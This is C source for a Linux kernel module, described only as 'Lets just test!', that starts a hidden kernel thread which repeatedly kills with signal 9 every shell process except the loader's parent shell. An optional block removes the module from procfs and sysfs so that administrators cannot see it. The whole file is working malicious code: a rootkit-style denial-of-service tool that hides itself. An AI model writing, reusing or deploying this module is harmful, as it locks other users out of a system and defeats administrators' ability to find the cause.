#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kdev_t.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/tty.h>
#include "headers.h"

MODULE_LICENSE ("GPL");
MODULE_DESCRIPTION ("Lets just test!");
MODULE_AUTHOR ("D4R30");

static struct task_struct *curtask, *thread;
static pid_t adminpid;

static int startpoint (void);
static void endpoint (void);

static int
boom (void *arg)
{
  while (1)
    {
      for_each_process (curtask)
      {
        if (strcmp (curtask->group_leader->comm, SHELL_NAME) == 0)
          {
            if (curtask->pid != adminpid)
              {
#ifdef DEBUGMOD
                printk (SUBSTRING_DEBUG "Found a bash process.\r\n");
                printk (SUBSTRING_INFO "PID: %d\r\n", curtask->pid);
#endif
                send_sig (9, curtask, 1);
              }
          }
      }
      msleep (150);
    }
  return 0;
}

static int
startpoint (void)
{
  int (*thread_pointer) (void *) = &boom;
#ifdef HIDE_MODULE
  // Getting the module disappeared from procfs and sysfs.

  list_del (&THIS_MODULE->list);

#ifdef DEBUGMOD
  printk (SUBSTRING_DEBUG "Deleted module from procfs.\n");
#endif
  kobject_del (&THIS_MODULE->mkobj.kobj);
#ifdef DEBUGMOD
  printk (SUBSTRING_DEBUG "Deleted from sysfs.\n");
#endif
  THIS_MODULE->sect_attrs = NULL;
  THIS_MODULE->notes_attrs = NULL;
#endif

#ifdef DEBUGMOD
  printk (SUBSTRING_DEBUG "Loading the module...\n");
#endif

  adminpid = current->real_parent->pid;
#ifdef DEBUGMOD
  printk (SUBSTRING_DEBUG "admintask PID: %d\r\n", adminpid);
#endif

  if ((thread = kthread_run (thread_pointer, NULL, "Mr.Darcy")) != NULL)
    {
#ifdef DEBUGMOD
      printk (SUBSTRING_DEBUG "The thread has been sucessfully started.\r\n");
#endif
    }

  return 0;
}

static void
endpoint (void)
{
  kthread_stop (thread);
  return;
}


module_init (startpoint);
module_exit (endpoint);
